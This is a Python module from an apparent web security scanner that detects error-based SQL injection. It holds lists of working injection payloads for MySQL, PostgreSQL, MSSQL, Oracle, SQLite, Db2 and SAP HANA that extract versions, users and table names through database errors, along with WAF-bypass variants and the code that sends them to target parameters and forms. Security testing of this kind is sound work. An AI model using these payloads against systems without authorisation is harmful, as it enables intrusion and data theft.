"""
Pythia Error-Based SQL Injection Detection
===========================================
Detects SQL injection by analyzing error messages in HTTP responses.

v0.2.0 additions:
  - DBMS-specific second-pass payloads (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  - WAF bypass variants in aggressive mode (50+ payloads)

Author: Rodney Dhavid Jimenez Chacin (rodhnin)
License: MIT
"""
import re
from typing import List, Dict, Optional, Tuple
from datetime import datetime, timezone

from ..core.logging import get_logger
from ..core.config import get_config
from .waf_bypass import ERROR_BASED_PAYLOADS_AGGRESSIVE, generate_waf_variants

logger = get_logger(__name__)


# DBMS-specific second-pass payloads — used when Phase 2 identifies the DBMS
DBMS_SPECIFIC_PAYLOADS: Dict[str, List[str]] = {
    'MySQL': [
        # EXTRACTVALUE — most reliable MySQL error extraction
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER())))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
        # UPDATEXML
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1)--",
        # FLOOR/RAND — triggers duplicate key error
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT VERSION()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT USER()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        # EXP — overflows
        "' AND EXP(~(SELECT * FROM(SELECT VERSION())a))--",
        "' AND EXP(~(SELECT * FROM(SELECT USER())a))--",
        # WAF bypass variants for EXTRACTVALUE
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/VERSION())))--",
        "' AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/USER())))--",
    ],
    'PostgreSQL': [
        # CAST to int — triggers type error with value disclosure
        "' AND CAST((SELECT VERSION()) AS int)--",
        "' AND CAST((SELECT current_user) AS int)--",
        "' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
        # CONVERT
        "' AND CONVERT((SELECT VERSION()), int)--",
        # pg_read_file (requires superuser — reveals privilege)
        "' AND 1=(SELECT 1 FROM pg_sleep(0) WHERE (SELECT usename FROM pg_user WHERE usesuperuser=true LIMIT 1) IS NOT NULL)--",
        # Error via regex
        "' AND 1=CAST('a' AS int)--",
        # WAF bypass
        "' AND CAST((SELECT/**/VERSION()) AS int)--",
    ],
    'Microsoft SQL Server': [
        # CONVERT with @@version
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        # CAST
        "' AND 1=CAST(@@version AS int)--",
        "' AND 1=CAST(DB_NAME() AS int)--",
        "' AND 1=CAST(USER_NAME() AS int)--",
        # Error_message
        "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sys.databases)--",
        # WAF bypass
        "' AND 1=CONVERT(int,@@version)--",
        "' AND/**/1=CONVERT(int,@@version)--",
    ],
    'Oracle': [
        # UTL_INADDR — triggers network lookup revealing data
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        # CTXSYS
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))--",
        # XMLTYPE error
        "' AND 1=XMLType((SELECT chr(60)||chr(58)||chr(118)||chr(101)||chr(114)||chr(115)||chr(105)||chr(111)||chr(110)||chr(40)||chr(41)||chr(62) FROM dual))--",
        # ORA-01476 (divide by zero to test executability)
        "' AND 1=(SELECT 1/0 FROM dual)--",
    ],
    'SQLite': [
        # SQLite has limited error-based extraction — use blind-style errors
        "' AND 1=CAST(sqlite_version() AS int)--",
        "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS int)--",
        "' AND CAST(sqlite_version() AS integer)=0--",
    ],
    'IBM Db2': [
        # XMLQUERY trick — triggers XPath error revealing data
        "' AND XMLQUERY('declare namespace x=\"x\"; $x/x' passing (SELECT VERSIONNUMBER FROM SYSIBM.SYSVERSIONS FETCH FIRST 1 ROWS ONLY) AS \"x\" RETURNING SEQUENCE)=''--",
        # CAST to int reveals string values via error
        "' AND 1=CAST((SELECT CURRENT SERVER FROM SYSIBM.SYSDUMMY1) AS INT)--",
        "' AND 1=CAST((SELECT USER FROM SYSIBM.SYSDUMMY1) AS INT)--",
        # Simple syntax error via SYSIBM.SYSDUMMY1 (equivalent to Oracle DUAL)
        "' AND 1=(SELECT 1 FROM SYSIBM.SYSDUMMY1 WHERE 1=CAST(USER AS INT))--",
        # DBINFO trick
        "' AND 1=CAST(DBINFO('version','full') AS INT)--",
    ],
    'SAP HANA': [
        # CAST to int on string triggers error with value disclosure
        "' AND 1=CAST(CURRENT_USER AS INT)--",
        "' AND 1=CAST(VERSION AS INT) FROM SYS.M_DATABASE--",
        "' AND 1=(SELECT CAST(SYSTEM_ID AS INT) FROM SYS.M_DATABASE)--",
        # M_DATABASE is SAP HANA's system catalog view
        "' AND EXISTS(SELECT 1 FROM SYS.M_DATABASE WHERE 1=CAST(VERSION AS INT))--",
        # Trigger type error via TO_INT
        "' AND 1=TO_INT(CURRENT_USER)--",
    ],
}


class ErrorBasedDetector:
    """
    Error-based SQL injection detector.
    
    Scans HTTP responses for database error messages that indicate
    SQL injection vulnerabilities.
    
    Supported DBMS:
    - MySQL / MariaDB
    - PostgreSQL
    - Microsoft SQL Server
    - Oracle Database
    - SQLite
    """
    
    # DBMS signatures for identification
    DBMS_SIGNATURES = {
        'MySQL': [
            'mysql', 'mariadb', 'mysqli_', 'mysqlclient'
        ],
        'PostgreSQL': [
            'postgresql', 'postgres', 'psql', 'pg_'
        ],
        'Microsoft SQL Server': [
            'microsoft sql server', 'mssql', 'sql server', 'sqlserver', 'odbc sql'
        ],
        'Oracle': [
            'oracle', 'ora-', 'oci8'
        ],
        'SQLite': [
            'sqlite', 'sqlite3'
        ],
        'IBM Db2': [
            'db2 sql error', 'sqlstate', 'db2/', 'ibm db2', 'sysibm',
            'com.ibm.db2', 'cli driver', 'db2 odbc'
        ],
        'SAP HANA': [
            'sap dbtech odbc', 'sap hana', 'hdbodbc', 'hdb.client',
            'sap ag', 'hana database error'
        ],
    }
    
    def __init__(self, config, http_client, auto_csrf: bool = False):
        """
        Initialize error-based detector.

        Args:
            config: Configuration object
            http_client: HTTP client for requests
            auto_csrf: Enable automatic CSRF token extraction
        """
        self.config = config
        self.http = http_client
        self.auto_csrf = auto_csrf

        # Determine mode (aggressive uses expanded payload set)
        self.aggressive = getattr(config, 'mode', 'safe') == 'aggressive'

        # Load error patterns from config
        if hasattr(config, 'sqli_error_patterns'):
            self.error_patterns = config.sqli_error_patterns
        else:
            # Fallback to default patterns
            self.error_patterns = self._get_default_error_patterns()

        # Compile regex patterns for performance
        self.compiled_patterns = [
            re.compile(pattern, re.IGNORECASE)
            for pattern in self.error_patterns
        ]

        # Load payloads from config — aggressive mode uses expanded set
        if self.aggressive:
            self.payloads = ERROR_BASED_PAYLOADS_AGGRESSIVE
        elif hasattr(config, 'sqli_error_payloads'):
            self.payloads = config.sqli_error_payloads
        else:
            self.payloads = self._get_default_payloads()

        logger.info(f"Error-based detector initialized ({'aggressive' if self.aggressive else 'safe'} mode)")
        logger.info(f"  Error patterns: {len(self.error_patterns)}")
        logger.info(f"  Test payloads: {len(self.payloads)}")
    
    def _get_default_error_patterns(self) -> List[str]:
        """Get default SQL error patterns."""
        return [
            # MySQL
            r"You have an error in your SQL syntax",
            r"Warning: mysql_",
            r"MySQLSyntaxErrorException",
            r"com\.mysql\.jdbc",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"PSQLException",
            
            # MSSQL
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark",
            
            # Oracle
            r"ORA-\d{5}",
            r"Oracle error",
            
            # SQLite
            r"SQLite3::SQLException",
            r"SQLiteException",
            
            # Generic
            r"SQL syntax.*MySQL",
            r"Warning.*\Wmysqli?_",
            r"valid MySQL result",
            r"SQL command not properly ended",

            # IBM Db2
            r"DB2 SQL Error",
            r"com\.ibm\.db2",
            r"SQLSTATE\[",
            r"CLI Driver.*DB2",
            r"DB2 ODBC",

            # SAP HANA
            r"SAP DBTech ODBC",
            r"SAP HANA",
            r"HDB ODBC",
            r"sap\.hdbclient",
        ]
    
    def _get_default_payloads(self) -> List[str]:
        """Get default error-based payloads."""
        return [
            "'",
            '"',
            "1'",
            "1\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "admin'--",
            "admin\"--",
            "1' AND '1'='1",
            "' OR 1=1--",
            "' OR 'x'='x",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
            "1 OR 1=1",
            "1 AND 1=2",
            "1 OR 1=1--",
            "1 OR 1=1#",
            "1 UNION SELECT 1,2",
            "1 UNION SELECT NULL,NULL",
            "a UNION SELECT 1,2",
            "999 OR 1=1",
            "0 OR 1=1",
        ]
    
    def detect_in_response(self, response, payload: str) -> Optional[Tuple[str, str, str]]:
        """
        Detect SQL error in HTTP response.
        
        Args:
            response: HTTP response object
            payload: Payload that was injected
        
        Returns:
            Tuple of (error_pattern, dbms_type, error_snippet) if found, None otherwise
        """
        # Get response text
        try:
            response_text = response.text
        except Exception as e:
            logger.error(f"Could not decode response: {e}")
            return None
        
        # Check each error pattern
        for pattern in self.compiled_patterns:
            match = pattern.search(response_text)
            if match:
                # Found SQL error!
                error_snippet = match.group(0)
                
                # Identify DBMS
                dbms_type = self._identify_dbms(response_text)
                
                # Get pattern string (for reporting)
                pattern_str = pattern.pattern
                
                logger.info(f"SQL error detected: {error_snippet[:100]}")
                logger.info(f"  DBMS: {dbms_type}")
                logger.info(f"  Pattern: {pattern_str[:100]}")
                
                return (pattern_str, dbms_type, error_snippet)
        
        return None
    
    def _identify_dbms(self, text: str) -> str:
        """
        Identify database management system from error message.
        
        Args:
            text: Response text containing error
        
        Returns:
            DBMS name or 'Unknown'
        """
        text_lower = text.lower()
        
        for dbms, signatures in self.DBMS_SIGNATURES.items():
            for signature in signatures:
                if signature.lower() in text_lower:
                    return dbms
        
        return 'Unknown'
    
    def test_url_parameter(
        self, 
        base_url: str, 
        param_name: str, 
        original_value: str,
        all_params: Dict[str, str],
        is_path_param: bool = False,
        param_position: Optional[int] = None,
        path_template: Optional[str] = None
    ) -> List[Dict]:
        """
        Test a single URL parameter for error-based SQLi.
        
        Args:
            base_url: Base URL (without parameters)
            param_name: Parameter name to test
            original_value: Original parameter value
            all_params: ALL parameters from original URL
            is_path_param: True if this is a path parameter
            param_position: Position in path (0-indexed)
            path_template: Path template with placeholders
        
        Returns:
            List of findings
        """
        findings = []
        
        logger.debug(f"Testing URL parameter: {param_name}={original_value}")
        
        # Get baseline response with ALL original parameters
        try:
            if is_path_param:
                baseline_url = f"{base_url}/{original_value}"
                baseline_response = self.http.get(baseline_url)
            else:
                baseline_params = all_params.copy()
                baseline_response = self.http.get(base_url, params=baseline_params)
        except Exception as e:
            logger.error(f"Failed to get baseline response: {e}")
            return findings
        
        # Test each payload
        for payload in self.payloads:
            try:
                if is_path_param:
                    test_url = f"{base_url}/{payload}"
                    response = self.http.get(test_url)
                else:
                    test_params = all_params.copy()
                    test_params[param_name] = payload
                    response = self.http.get(base_url, params=test_params)
                
                # Check for SQL error
                detection = self.detect_in_response(response, payload)
                
                if detection:
                    pattern, dbms, error_snippet = detection
                    
                    if is_path_param:
                        # Path parameter: simple construction
                        clean_url = f"{base_url}/{payload}"
                    else:
                        # Query parameter: use ALL original params, update tested one
                        from urllib.parse import urlparse, urlencode, urlunparse
                        
                        # Start with ALL original params
                        params_for_url = all_params.copy()

                        # Keep original value in URL (not the payload — payload goes in evidence)
                        params_for_url[param_name] = original_value

                        # Build clean URL
                        parsed = urlparse(base_url)
                        new_query = urlencode(params_for_url, doseq=False)
                        clean_url = urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            '',
                            new_query,
                            ''
                        ))
                    
                    logger.debug(f" Clean finding URL: {clean_url}")
                    
                    # Create finding with clean URL
                    finding = self._create_finding(
                        url=clean_url,  # ← URL limpio con TODOS los params
                        parameter=param_name,
                        payload=payload,
                        dbms=dbms,
                        error_pattern=pattern,
                        error_snippet=error_snippet,
                        method='GET',
                        original_value=original_value,
                        is_path_param=is_path_param,
                        param_position=param_position,
                        path_template=path_template
                    )
                    
                    findings.append(finding)
                    
                    # Stop testing this parameter once vulnerability confirmed
                    logger.info(f"✓ SQL injection confirmed in parameter '{param_name}'")
                    break
            
            except Exception as e:
                logger.error(f"Error testing payload '{payload}': {e}")
                continue
        
        return findings
    
    def test_form_callback(
        self, 
        response, 
        payload: str, 
        field_name: str,
        form: Dict
    ) -> Optional[Dict]:
        """
        Callback for form testing - checks if response contains SQL error.
        
        Args:
            response: HTTP response
            payload: Injected payload
            field_name: Field name that was tested
            form: Form dictionary
        
        Returns:
            Finding dictionary if vulnerability found, None otherwise
        """
        detection = self.detect_in_response(response, payload)

        if detection:
            pattern, dbms, error_snippet = detection
            finding = self._create_finding(
                url=form['action'],
                parameter=field_name,
                payload=payload,
                dbms=dbms,
                error_pattern=pattern,
                error_snippet=error_snippet,
                method=form['method'].upper(),
                form_context=form,
                original_value='1'
            )
            return finding

        # Session-variable / second-order pattern:
        parent_url = form.get('parent_url', '')
        if parent_url and parent_url != form.get('action', ''):
            try:
                parent_resp = self.http.get(parent_url)

                # 1. Standard SQL error pattern match
                detection2 = self.detect_in_response(parent_resp, payload)
                if detection2:
                    pattern, dbms, error_snippet = detection2
                    logger.info(
                        f"[SESSION-VAR] SQL error on parent {parent_url} "
                        f"after POST to {form['action']} (field={field_name})"
                    )
                    return self._create_finding(
                        url=parent_url,
                        parameter=field_name,
                        payload=payload,
                        dbms=dbms,
                        error_pattern=pattern,
                        error_snippet=error_snippet,
                        method=form['method'].upper(),
                        form_context=form,
                        original_value='1'
                    )

                # 2. Generic PHP die() obfuscation pattern:
                _generic_die_patterns = [
                    'something went wrong',
                    'database error occurred',
                    'an error has occurred',
                    'internal server error',
                    'query failed',
                ]
                parent_text_lower = parent_resp.text.lower()
                for die_pat in _generic_die_patterns:
                    if die_pat in parent_text_lower:
                        # Verify it doesn't appear on baseline (benign request).
                        try:
                            # Fetch fresh hidden field values (incl. new CSRF token)
                            _fresh_hidden = {}
                            try:
                                _fresh_page = self.http.get(form.get('action', parent_url))
                                from bs4 import BeautifulSoup as _BS
                                _soup = _BS(_fresh_page.text, 'html.parser')
                                _fresh_hidden = {
                                    _inp.get('name'): _inp.get('value', '')
                                    for _inp in _soup.find_all('input', {'type': 'hidden'})
                                    if _inp.get('name')
                                }
                            except Exception:
                                pass

                            # Build reset data: benign value for testable fields,
                            # fresh hidden values (CSRF token) for hidden fields
                            _reset_data = {}
                            for i in form.get('inputs', []):
                                _name = i.get('name', '')
                                if not _name or i.get('type', '') == 'submit':
                                    continue
                                if i.get('type', '') == 'hidden':
                                    _reset_data[_name] = _fresh_hidden.get(
                                        _name, i.get('value', ''))
                                else:
                                    _reset_data[_name] = '1'

                            self.http.post(form.get('action', parent_url), data=_reset_data)
                            baseline_resp = self.http.get(parent_url)
                            if die_pat not in baseline_resp.text.lower():
                                logger.info(
                                    f"[SESSION-VAR] Generic error '{die_pat}' on parent "
                                    f"{parent_url} after injection — not in baseline ✓"
                                )
                                return self._create_finding(
                                    url=parent_url,
                                    parameter=field_name,
                                    payload=payload,
                                    dbms='Unknown',
                                    error_pattern=die_pat,
                                    error_snippet=f"Generic error response: '{die_pat}' appeared after SQL payload injection",
                                    method=form['method'].upper(),
                                    form_context=form,
                                    original_value='1'
                                )
                        except Exception:
                            pass
                        break

            except Exception as e:
                logger.debug(f"[SESSION-VAR] Parent page check failed: {e}")

        return None
    
    def _create_finding(
        self,
        url: str,
        parameter: str,
        payload: str,
        dbms: str,
        error_pattern: str,
        error_snippet: str,
        method: str = 'GET',
        form_context: Optional[Dict] = None,
        original_value: str = '1',
        is_path_param: bool = False,
        param_position: Optional[int] = None,
        path_template: Optional[str] = None
    ) -> Dict:
        """
        Create a finding dictionary for error-based SQLi.
        
        Args:
            url: Vulnerable URL
            parameter: Vulnerable parameter/field name
            payload: Payload that triggered error
            dbms: Identified DBMS type
            error_pattern: Regex pattern that matched
            error_snippet: Actual error text from response
            method: HTTP method (GET/POST)
            form_context: Form dictionary if testing form
            original_value: Original parameter value (for time-based)
            is_path_param: True if this is a path parameter
            param_position: Position in path (0-indexed)
            path_template: Path template with placeholders
        
        Returns:
            Finding dictionary
        """
        # Determine finding ID based on DBMS
        dbms_codes = {
            'MySQL': 'PYTHIA-SQL-001',
            'PostgreSQL': 'PYTHIA-SQL-002',
            'Microsoft SQL Server': 'PYTHIA-SQL-003',
            'Oracle': 'PYTHIA-SQL-004',
            'SQLite': 'PYTHIA-SQL-005',
            'IBM Db2': 'PYTHIA-SQL-006',
            'SAP HANA': 'PYTHIA-SQL-007',
            'Unknown': 'PYTHIA-SQL-000'
        }
        
        finding_id = dbms_codes.get(dbms, 'PYTHIA-SQL-000')
        
        # Build title
        title = f"Error-Based SQL Injection - {dbms}"
        
        # Build description
        if form_context:
            from .forms import FormTester
            form_desc = FormTester.extract_form_context(None, form_context)
            description = (
                f"SQL injection vulnerability detected in form field '{parameter}'. "
                f"The application is vulnerable to error-based SQL injection, "
                f"which allows attackers to extract database information through "
                f"error messages. The database is {dbms}. "
                f"Form: {form_desc}"
            )
        else:
            description = (
                f"SQL injection vulnerability detected in URL parameter '{parameter}'. "
                f"The application is vulnerable to error-based SQL injection, "
                f"which allows attackers to extract database information through "
                f"error messages. The database is {dbms}."
            )
        
        # Truncate error snippet for evidence
        max_snippet_length = 500
        if len(error_snippet) > max_snippet_length:
            error_snippet = error_snippet[:max_snippet_length] + "..."
        
        # Build recommendation
        recommendation = (
            f"Use parameterized queries (prepared statements) to prevent SQL injection. "
            f"Never concatenate user input directly into SQL queries. "
            f"Implement input validation and sanitization. "
            f"Disable detailed error messages in production."
        )
        
        # Build evidence
        evidence = {
            'type': 'http_response',
            'value': error_snippet,
            'context': f"{method} request to {url} - DBMS: {dbms}",
            'method': method,
            'url': url,
            'parameter': parameter,
            'payload': payload,
            'original_value': original_value,
            'dbms': dbms,
            'error_pattern': error_pattern,
            'error_snippet': error_snippet,
            'is_path_param': is_path_param,
            'param_position': param_position,
            'path_template': path_template,
            'form': form_context
        }
        
        # References
        references = [
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
            'https://cwe.mitre.org/data/definitions/89.html'
        ]
        
        finding = {
            'id': finding_id,
            'title': title,
            'description': description,
            'severity': 'critical',
            'confidence': 'high',
            'recommendation': recommendation,
            'evidence': evidence,
            'references': references,
            'affected_component': f"{method} {url} (parameter: {parameter})",
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'detection_method': 'error-based'
        }
        
        return finding
    
    def _enrich_finding_with_dbms_payload(
        self,
        finding: Dict,
        base_url: str,
        params: Dict[str, str],
        param_name: str,
        detected_dbms: str,
        is_path_param: bool = False,
    ) -> None:
        """
        Enrich an existing finding in-place with DBMS-specific payload evidence.

        Does NOT create new findings — updates the existing finding's evidence
        to include more specific extraction (e.g. EXTRACTVALUE showing VERSION()).
        This avoids generating duplicates while still improving evidence quality.
        """
        dbms_payloads = DBMS_SPECIFIC_PAYLOADS.get(detected_dbms, [])
        if not dbms_payloads:
            return

        logger.info(
            f"[DBMS-ENRICH] Enriching '{param_name}' with {detected_dbms}-specific "
            f"payloads ({len(dbms_payloads)} to try)"
        )
        for payload in dbms_payloads:
            try:
                if is_path_param:
                    response = self.http.get(f"{base_url}/{payload}")
                else:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    response = self.http.get(base_url, params=test_params)

                detection = self.detect_in_response(response, payload)
                if detection:
                    _pattern, _dbms, error_snippet = detection
                    # Enrich existing finding evidence in-place
                    evidence = finding.setdefault('evidence', {})
                    evidence['dbms_specific_payload'] = payload
                    evidence['dbms_specific_snippet'] = error_snippet
                    evidence['dbms_confirmed'] = True
                    logger.info(
                        f"[DBMS-ENRICH] ✓ {detected_dbms} confirmed with "
                        f"extraction payload for '{param_name}'"
                    )
                    return  # One confirmation is enough
            except Exception as e:
                logger.debug(f"[DBMS-ENRICH] Payload failed: {e}")
                continue

    def scan(self, urls_with_params: List[Dict], forms: List[Dict]) -> List[Dict]:
        """
        Scan URLs and forms for error-based SQL injection.

        In aggressive mode:
          - Uses 50+ payloads including WAF bypass variants
          - When a DBMS is identified, runs a second pass with DBMS-specific
            extraction payloads for higher-confidence evidence

        Args:
            urls_with_params: List of URL dictionaries with parameters
            forms: List of form dictionaries

        Returns:
            List of all findings
        """
        findings = []

        logger.info(f"Starting error-based SQL injection scan")
        logger.info(f"  URLs to test: {len(urls_with_params)}")
        logger.info(f"  Forms to test: {len(forms)}")

        # Test URL parameters
        for url_dict in urls_with_params:
            base_url = url_dict['base_url']
            params = url_dict['parameters']

            # Check if this is a path parameter (from crawler)
            is_path_param = url_dict.get('is_path_param', False)
            param_position = url_dict.get('param_position', None)
            path_template = url_dict.get('path_template', None)

            if is_path_param:
                logger.info(f"Testing URL (path param): {base_url}/{list(params.values())[0]} [{path_template}]")
            else:
                logger.info(f"Testing URL (query param): {base_url}")

            for param_name, param_value in params.items():
                param_findings = self.test_url_parameter(
                    base_url,
                    param_name,
                    param_value,
                    all_params=params,
                    is_path_param=is_path_param,
                    param_position=param_position,
                    path_template=path_template
                )
                findings.extend(param_findings)

                # DBMS-specific enrichment (aggressive mode, in-place, no new findings)
                if self.aggressive and param_findings:
                    for f in param_findings:
                        dbms = f.get('evidence', {}).get('dbms', 'Unknown')
                        if dbms and dbms != 'Unknown':
                            self._enrich_finding_with_dbms_payload(
                                finding=f,
                                base_url=base_url,
                                params=params,
                                param_name=param_name,
                                detected_dbms=dbms,
                                is_path_param=is_path_param,
                            )
                            break  # Only enrich once per URL/param group

        # Test forms
        if forms:
            from .forms import FormTester
            form_tester = FormTester(self.config, self.http, auto_csrf=self.auto_csrf)

            for form in forms:
                form_findings = form_tester.test_form(
                    form,
                    self.payloads,
                    self.test_form_callback
                )
                findings.extend(form_findings)

        logger.info(f"Error-based scan complete: {len(findings)} vulnerabilities found")

        return findings


if __name__ == '__main__':
    # Test error-based detector
    from ..core.config import Config
    from ..core.http_client import create_http_client
    
    config = Config.load()
    http_client = create_http_client(mode='safe', config=config)
    
    detector = ErrorBasedDetector(config, http_client)
    
    # Test detection
    class MockResponse:
        def __init__(self, text, url):
            self.text = text
            self.url = url
    
    response = MockResponse(
        "You have an error in your SQL syntax near ''1' at line 1",
        "https://example.com/product?id=1'"
    )
    
    detection = detector.detect_in_response(response, "'")
    if detection:
        print(f"SQL error detected: {detection}")
